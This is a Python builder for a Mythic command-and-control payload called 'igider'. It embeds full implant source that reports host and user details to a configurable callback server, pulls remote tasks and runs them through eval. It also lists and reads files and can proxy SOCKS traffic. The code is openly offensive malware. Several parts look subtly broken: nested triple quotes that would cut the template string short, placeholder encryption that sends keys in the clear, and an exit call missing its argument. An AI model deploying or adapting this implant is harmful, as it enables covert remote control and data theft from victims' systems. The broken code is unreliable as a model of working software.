from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

import asyncio
import pathlib
import os
import tempfile
import base64
import hashlib
import json
import random
import string
import logging
from typing import Dict, Any, List, Optional

class Igider(PayloadType):
    name = "igider"
    file_extension = "py"
    author = "@med"
    supported_os = [
        SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS
    ]
    wrapper = False
    wrapped_payloads = ["pickle_wrapper"]
    mythic_encrypts = True
    note = "Python agent for command execution"
    supports_dynamic_loading = True
    
    build_parameters = [
        BuildParameter(
            name="callback_host", 
            parameter_type=BuildParameterType.String, 
            description="Callback Host", 
            default_value="http://127.0.0.1", 
            required=True
        ),
        BuildParameter(
            name="callback_port", 
            parameter_type=BuildParameterType.String, 
            description="Callback Port", 
            default_value="80", 
            required=True
        ),
        BuildParameter(
            name="post_uri", 
            parameter_type=BuildParameterType.String, 
            description="Post URI", 
            default_value="/data", 
            required=True
        ),
        BuildParameter(
            name="get_uri", 
            parameter_type=BuildParameterType.String, 
            description="Get URI", 
            default_value="/index", 
            required=True
        ),
        BuildParameter(
            name="get_param", 
            parameter_type=BuildParameterType.String, 
            description="Get URI Parameter", 
            default_value="q", 
            required=True
        ),
        BuildParameter(
            name="sleep_time", 
            parameter_type=BuildParameterType.Number, 
            description="Sleep Time (seconds)", 
            default_value=10, 
            required=True
        ),
        BuildParameter(
            name="jitter", 
            parameter_type=BuildParameterType.Number, 
            description="Jitter (%)", 
            default_value=23, 
            required=True
        ),
        BuildParameter(
            name="kill_date", 
            parameter_type=BuildParameterType.String, 
            description="Kill Date (YYYY-MM-DD)", 
            default_value="2026-05-21", 
            required=True
        ),
        BuildParameter(
            name="proxy_host", 
            parameter_type=BuildParameterType.String, 
            description="Proxy Host (Optional)", 
            default_value="", 
            required=False
        ),
        BuildParameter(
            name="proxy_port", 
            parameter_type=BuildParameterType.String, 
            description="Proxy Port (Optional)", 
            default_value="", 
            required=False
        ),
        BuildParameter(
            name="proxy_user", 
            parameter_type=BuildParameterType.String, 
            description="Proxy Username (Optional)", 
            default_value="", 
            required=False
        ),
        BuildParameter(
            name="proxy_pass", 
            parameter_type=BuildParameterType.String, 
            description="Proxy Password (Optional)", 
            default_value="", 
            required=False
        ),
    ]
    c2_profiles = ["http"]
    
    # Use relative paths that can be configured
    _BASE_DIR = pathlib.Path(".")
    
    @property
    def agent_path(self) -> pathlib.Path:
        return self._BASE_DIR / "igider" / "mythic"
    
    @property
    def agent_code_path(self) -> pathlib.Path:
        return self._BASE_DIR / "igider" / "agent_code"
    
    build_steps = [
        BuildStep(step_name="Initializing Build", step_description="Setting up the build environment"),
        BuildStep(step_name="Gathering Components", step_description="Collecting agent code modules"),
        BuildStep(step_name="Configuring Agent", step_description="Applying configuration parameters"),
        BuildStep(step_name="Finalizing Payload", step_description="Preparing final output format")
    ]

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.logger = logging.getLogger("igider_builder")
        self.logger.setLevel(logging.DEBUG)

    def get_parameter(self, name: str) -> Any:
        """Get a parameter value from build parameters."""
        for param in self.build_parameters:
            if param.name == name:
                return param.value
        return None

    async def build(self) -> BuildResponse:
        """Build the Igider payload with the specified configuration."""
        resp = BuildResponse(status=BuildStatus.Success)
        
        try:
            # Step 1: Initialize build
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Initializing Build",
                StepStdout="Starting build process...",
                StepSuccess=True
            ))
            
            # Create the base agent template
            agent_code = self.generate_agent_code()
            
            # Step 2: Gather command modules
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gathering Components", 
                StepStdout="Including command modules...",
                StepSuccess=True
            ))
            
            # Add command functions - simplified for this example
            command_functions = self.generate_command_functions()
            agent_code = agent_code.replace("#COMMANDS_PLACEHOLDER", command_functions)
            
            # Step 3: Configure agent
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Configuring Agent",
                StepStdout="Applying agent configuration...",
                StepSuccess=True
            ))
            
            # Apply build parameters to configuration
            agent_code = self.configure_agent(agent_code)
            
            # Step 4: Finalize payload
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Finalizing Payload",
                StepStdout="Preparing final output...",
                StepSuccess=True
            ))
            
            resp.payload = agent_code.encode()
            resp.build_message = "Successfully built Igider Python agent"
            
        except Exception as e:
            self.logger.error(f"Build failed: {str(e)}")
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = f"Error building payload: {str(e)}"
            
        return resp
    
    def generate_agent_code(self) -> str:
        """Generate the base agent code."""
        return """import os, random, sys, json, socket, base64, time, platform, ssl, getpass
import urllib.request
from datetime import datetime
import threading, queue

CHUNK_SIZE = 51200

class igider:
    """
    Determines and returns the operating system version.
    It prioritizes returning macOS version if available, otherwise returns the general system name and release.
    """
    def getOSVersion(self):
        if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
        else: return platform.system() + " " + platform.release()

    """
    Attempts to retrieve the current username.
    It first tries using the getpass module, then iterates through common environment variables for username information.
    """
    def getUsername(self):
        try: return getpass.getuser()
        except: pass
        for k in [ "USER", "LOGNAME", "USERNAME" ]: 
            if k in os.environ.keys(): return os.environ[k]
            
    """
    Formats a message by encoding it with base64 after prepending the agent's UUID and encrypting the JSON representation of the data.
    Optionally uses URL-safe base64 encoding.
    """
    def formatMessage(self, data, urlsafe=False):
        output = base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
        if urlsafe: 
            output = base64.urlsafe_b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
        return output

    """
    Removes the agent's UUID from the beginning of the received data and then loads it as a JSON object.
    This function assumes the server's response is prefixed with the agent's UUID.
    """
    def formatResponse(self, data):
        return json.loads(data.replace(self.agent_config["UUID"],""))

    """
    Formats a message, sends it to the server using a POST request, decrypts the response, and then formats it as a JSON object.
    This is a convenience function for sending data and receiving a structured response.
    """
    def postMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data),'POST')))

    """
    Formats a message using URL-safe base64, sends it to the server using a GET request, decrypts the response, and then formats it as a JSON object.
    URL-safe base64 is often used for GET requests to avoid issues with special characters in URLs.
    """
    def getMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data, True))))

    """
    Constructs a message to update the server with the output of a specific task.
    This message indicates that the task is not yet completed.
    """
    def sendTaskOutputUpdate(self, task_id, output):
        responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
        message = { "action": "post_response", "responses": responses }
        response_data = self.postMessageAndRetrieveResponse(message)

    """
    Gathers completed task responses and any queued socks connections to send to the server.
    It iterates through the completed tasks, formats their output, and then constructs a message to send.
    Successful tasks are removed from the internal task list.
    """
    def postResponses(self):
        try:
            responses = []
            socks = []
            taskings = self.taskings
            for task in taskings:
                if task["completed"] == True:
                    out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
                    if task["error"]: out["status"] = "error"
                    for func in ["processes", "file_browser"]: 
                        if func in task: out[func] = task[func]
                    responses.append(out)
            while not self.socks_out.empty(): socks.append(self.socks_out.get())
            if ((len(responses) > 0) or (len(socks) > 0)):
                message = { "action": "post_response", "responses": responses }
                if socks: message["socks"] = socks
                response_data = self.postMessageAndRetrieveResponse(message)
                for resp in response_data["responses"]:
                    task_index = [t for t in self.taskings \\
                        if resp["task_id"] == t["task_id"] \\
                        and resp["status"] == "success"][0]
                    self.taskings.pop(self.taskings.index(task_index))
        except: pass

    """
    Executes a given task by calling the corresponding function within the agent.
    It handles parameter parsing, function execution, error handling, and updates the task status.
    """
    def processTask(self, task):
        try:
            task["started"] = True
            function = getattr(self, task["command"], None)
            if(callable(function)):
                try:
                    params = json.loads(task["parameters"]) if task["parameters"] else {}
                    params['task_id'] = task["task_id"] 
                    command =  "self." + task["command"] + "(**params)"
                    output = eval(command)
                except Exception as error:
                    output = str(error)
                    task["error"] = True                        
                task["result"] = output
                task["completed"] = True
            else:
                task["error"] = True
                task["completed"] = True
                task["result"] = "Function unavailable."
        except Exception as error:
            task["error"] = True
            task["completed"] = True
            task["result"] = error

    """
    Iterates through the received tasks and creates a new thread for each unstarted task to execute it concurrently.
    This allows the agent to handle multiple tasks simultaneously.
    """
    def processTaskings(self):
        threads = list()       
        taskings = self.taskings     
        for task in taskings:
            if task["started"] == False:
                x = threading.Thread(target=self.processTask, name="{}:{}".format(task["command"], task["task_id"]), args=(task,))
                threads.append(x)
                x.start()

    """
    Requests new tasks from the server.
    It sends a GET request with information about the desired tasking size and processes the received tasks and any new socks connection information.
    """
    def getTaskings(self):
        data = { "action": "get_tasking", "tasking_size": -1 }
        tasking_data = self.getMessageAndRetrieveResponse(data)
        for task in tasking_data["tasks"]:
            t = {
                "task_id":task["id"],
                "command":task["command"],
                "parameters":task["parameters"],
                "result":"",
                "completed": False,
                "started":False,
                "error":False,
                "stopped":False
            }
            self.taskings.append(t)
        if "socks" in tasking_data:
            for packet in tasking_data["socks"]: self.socks_in.put(packet)

    """
    Initializes the agent by sending a check-in request to the server.
    It gathers system information and the initial payload UUID, encrypts it, and sends it to the server.
    Upon successful check-in, it receives and stores the agent's unique UUID.
    """
    def checkIn(self):
        hostname = socket.gethostname()
        ip = ''
        if hostname and len(hostname) > 0:
            try:
                ip = socket.gethostbyname(hostname)
            except:
                pass

        data = {
            "action": "checkin",
            "ip": ip,
            "os": self.getOSVersion(),
            "user": self.getUsername(),
            "host": hostname,
            "domain:": socket.getfqdn(),
            "pid": os.getpid(),
            "uuid": self.agent_config["PayloadUUID"],
            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
            "encryption_key": self.agent_config["enc_key"]["enc_key"],
            "decryption_key": self.agent_config["enc_key"]["dec_key"]
        }
        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
        decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
        if("status" in decoded_data):
            UUID = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"],""))["id"]
            self.agent_config["UUID"] = UUID
            return True
        else: return False

    """
    Makes an HTTP or HTTPS request to the command and control server.
    It handles both GET and POST requests, includes custom headers, and manages proxy configurations if provided.
    """
    def makeRequest(self, data, method='GET'):
        hdrs = {}
        for header in self.agent_config["Headers"]:
            hdrs[header] = self.agent_config["Headers"][header]
        if method == 'GET':
            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetParam"] + "=" + data.decode(), None, hdrs)
        else:
            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)
            
        if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
            tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
            handler = urllib.request.HTTPSHandler if tls else urllib.request.HTTPHandler
            if self.agent_config["ProxyUser"] and self.agent_config["ProxyPass"]:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}@{}:{}'.format(tls, self.agent_config["ProxyUser"], self.agent_config["ProxyPass"], \\
                        self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                auth = urllib.request.HTTPBasicAuthHandler()
                opener = urllib.request.build_opener(proxy, auth, handler)
            else:
                proxy = urllib.request.ProxyHandler({
                    "{}".format(tls): '{}://{}:{}'.format(tls, self.agent_config["ProxyHost"].replace(tls+"://", ""), self.agent_config["ProxyPort"])
                })
                opener = urllib.request.build_opener(proxy, handler)
            urllib.request.install_opener(opener)
        try:
            with urllib.request.urlopen(req) as response:
                out = base64.b64decode(response.read())
                response.close()
                return out
        except: return ""

    """
    Checks if the current date has passed the configured kill date for the agent.
    If the current date is on or after the kill date, it returns True.
    """
    def passedKilldate(self):
        kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
        kd = datetime(kd_list[0], kd_list[1], kd_list[2])
        if datetime.now() >= kd: return True
        else: return False

    """
    Pauses the agent's execution for a duration determined by the configured sleep interval and jitter.
    It calculates a random jitter value within the specified percentage and adds it to the base sleep time.
    """
    def agentSleep(self):
        j = 0
        if int(self.agent_config["Jitter"]) > 0:
            v = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"])/100)
            if int(v) > 0:
                j = random.randrange(0, int(v))    
        time.sleep(self.agent_config["Sleep"]+j)
        
    # Add encryption/decryption methods
    def encrypt(self, data):
        # Basic encryption placeholder - in real implementation, this would use the encryption key
        return data
        
    def decrypt(self, data):
        # Basic decryption placeholder - in real implementation, this would use the decryption key
        return data
        
#COMMANDS_PLACEHOLDER

    """
    Initializes the agent object.
    It sets up queues for socks connections, a list to track tasks, a cache for metadata, and the agent's configuration loaded from predefined variables.
    It then enters the main loop for agent operation, handling check-in, tasking, and response posting.
    """
    def __init__(self):
        self.socks_open = {}
        self.socks_in = queue.Queue()
        self.socks_out = queue.Queue()
        self.taskings = []
        self._meta_cache = {}
        self.moduleRepo = {}
        self.current_directory = os.getcwd()
        self.agent_config = {
            "Server": "SERVER_PLACEHOLDER",
            "Port": "PORT_PLACEHOLDER",
            "PostURI": "POST_URI_PLACEHOLDER",
            "PayloadUUID": "UUID_PLACEHOLDER",
            "UUID": "",
            "Headers": {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"},
            "Sleep": SLEEP_PLACEHOLDER,
            "Jitter": JITTER_PLACEHOLDER,
            "KillDate": "KILLDATE_PLACEHOLDER",
            "enc_key": ENC_KEY_PLACEHOLDER,
            "GetURI": "GET_URI_PLACEHOLDER",
            "GetParam": "GET_PARAM_PLACEHOLDER",
            "ProxyHost": "PROXY_HOST_PLACEHOLDER",
            "ProxyUser": "PROXY_USER_PLACEHOLDER",
            "ProxyPass": "PROXY_PASS_PLACEHOLDER",
            "ProxyPort": "PROXY_PORT_PLACEHOLDER",
        }

        while(True):
            if(self.agent_config["UUID"] == ""):
                self.checkIn()
                self.agentSleep()
            else:
                while(True):
                    if self.passedKilldate():
                        self.exit()
                    try:
                        self.getTaskings()
                        self.processTaskings()
                        self.postResponses()
                    except: pass
                    self.agentSleep()                   

if __name__ == "__main__":
    igider = igider()
"""

    def generate_command_functions(self) -> str:
        """Generate command functions for the agent."""
        return """
    def ls(self, task_id, path, file_browser=False):
        if path == ".": file_path = self.current_directory
        else: file_path = path if path[0] == os.sep \\
                else os.path.join(self.current_directory,path)
        file_details = os.stat(file_path)
        target_is_file = os.path.isfile(file_path)
        target_name = os.path.basename(file_path.rstrip(os.sep)) if file_path != os.sep else os.sep
        file_browser = {
            "host": socket.gethostname(),
            "is_file": target_is_file,
            "permissions": {"octal": oct(file_details.st_mode)[-3:]},
            "name": target_name if target_name not in [".", "" ] \\
                    else os.path.basename(self.current_directory.rstrip(os.sep)),        
            "parent_path": os.path.abspath(os.path.join(file_path, os.pardir)),
            "success": True,
            "access_time": int(file_details.st_atime * 1000),
            "modify_time": int(file_details.st_mtime * 1000),
            "size": file_details.st_size,
            "update_deleted": True,
        }
        files = []
        if not target_is_file:
            with os.scandir(file_path) as entries:
                for entry in entries:
                    file = {}
                    file['name'] = entry.name
                    file['is_file'] = True if entry.is_file() else False
                    try:
                        file_details = os.stat(os.path.join(file_path, entry.name))
                        file["permissions"] = { "octal": oct(file_details.st_mode)[-3:]}
                        file["access_time"] = int(file_details.st_atime * 1000)
                        file["modify_time"] = int(file_details.st_mtime * 1000)
                        file["size"] = file_details.st_size
                    except OSError as e:
                        pass
                    files.append(file)  
        file_browser["files"] = files
        task = [task for task in self.taskings if task["task_id"] == task_id]
        task[0]["file_browser"] = file_browser
        output = { "files": files, "parent_path": os.path.abspath(os.path.join(file_path, os.pardir)), "name":  target_name if target_name not in  [".", ""] \\
                    else os.path.basename(self.current_directory.rstrip(os.sep))  }
        return json.dumps(output)

    def cat(self, task_id, path):
        file_path = path if path[0] == os.sep \\
                else os.path.join(self.current_directory,path)
        
        with open(file_path, 'r') as f:
            content = f.readlines()
            return ''.join(content)

    def exit(self, task_id):
        os._exit(0)
    """
    
    def configure_agent(self, agent_code: str) -> str:
        """Configure the agent with build parameters."""
        # Replace placeholder values with actual configuration
        replacements = {
            "SERVER_PLACEHOLDER": self.get_parameter("callback_host"),
            "PORT_PLACEHOLDER": self.get_parameter("callback_port"),
            "POST_URI_PLACEHOLDER": self.get_parameter("post_uri"),
            "GET_URI_PLACEHOLDER": self.get_parameter("get_uri"),
            "GET_PARAM_PLACEHOLDER": self.get_parameter("get_param"),
            "SLEEP_PLACEHOLDER": str(self.get_parameter("sleep_time")),
            "JITTER_PLACEHOLDER": str(self.get_parameter("jitter")),
            "KILLDATE_PLACEHOLDER": self.get_parameter("kill_date"),
            "UUID_PLACEHOLDER": self.uuid,
            "PROXY_HOST_PLACEHOLDER": self.get_parameter("proxy_host") or "",
            "PROXY_PORT_PLACEHOLDER": self.get_parameter("proxy_port") or "",
            "PROXY_USER_PLACEHOLDER": self.get_parameter("proxy_user") or "",
            "PROXY_PASS_PLACEHOLDER": self.get_parameter("proxy_pass") or ""
        }
        
        # Get encryption keys from C2 profile
        enc_key_dict = {"value": "aes256_hmac", "enc_key": "", "dec_key": ""}
        for c2 in self.c2info:
            profile = c2.get_c2profile()
            if profile["name"] == "http":
                params = c2.get_parameters_dict()
                if "AESPSK" in params:
                    enc_key = params["AESPSK"]
                    enc_key_dict["enc_key"] = enc_key
                    enc_key_dict["dec_key"] = enc_key
        
        # Replace encryption key placeholder
        agent_code = agent_code.replace("ENC_KEY_PLACEHOLDER", json.dumps(enc_key_dict))
        
        # Apply other replacements
        for placeholder, value in replacements.items():
            agent_code = agent_code.replace(placeholder, str(value))
            
        return agent_code